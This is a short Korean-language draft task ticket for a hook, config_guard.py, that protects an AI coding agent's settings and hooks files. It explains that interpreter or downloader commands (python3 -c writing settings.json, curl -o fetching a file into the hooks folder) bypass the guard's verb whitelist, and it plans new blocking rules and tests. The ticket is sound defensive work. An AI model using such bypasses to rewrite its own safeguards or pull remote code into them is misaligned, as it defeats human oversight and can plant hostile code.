---
id: DRAFT-3
title: 'config_guard.py: 인터프리터/curl 경유 쓰기 우회 차단'
status: Draft
assignee: []
created_date: '2026-09-18 16:12'
updated_date: '2026-09-18 16:12'
labels: []
dependencies: []
documentation:
  - hooks/config_guard.py
---

## Description

<!-- SECTION:DESCRIPTION:BEGIN -->
현재 config_guard.py는 verb 화이트리스트(rm/mv/cp/truncate/tee/dd/sed) + > 리다이렉트만 검사한다. python3 -c "open('~/.claude/settings.json','w').write(...)" 나 curl -o ~/.claude/hooks/x.py <url> 처럼 인터프리터/다운로더를 거치면 verb가 화이트리스트에 없어 통과한다. 이 훅의 docstring이 명시하는 위협 모델(CHAINDROP npm worm, CVE-2026-25725)과 정확히 같은 공격이 셸 리다이렉트 대신 인터프리터를 한 겹 거치면 뚫리는 상태.
<!-- SECTION:DESCRIPTION:END -->

## Acceptance Criteria
<!-- AC:BEGIN -->
- [ ] #1 python3/python/node/ruby/perl/curl/wget 같은 범용 인터프리터/다운로더 + 보호 경로 조합을 차단하는 규칙 추가
- [ ] #2 test_config_guard.py에 python3 -c / curl -o 경유 우회 시도가 이제 막히는 걸 검증하는 테스트 추가
<!-- AC:END -->
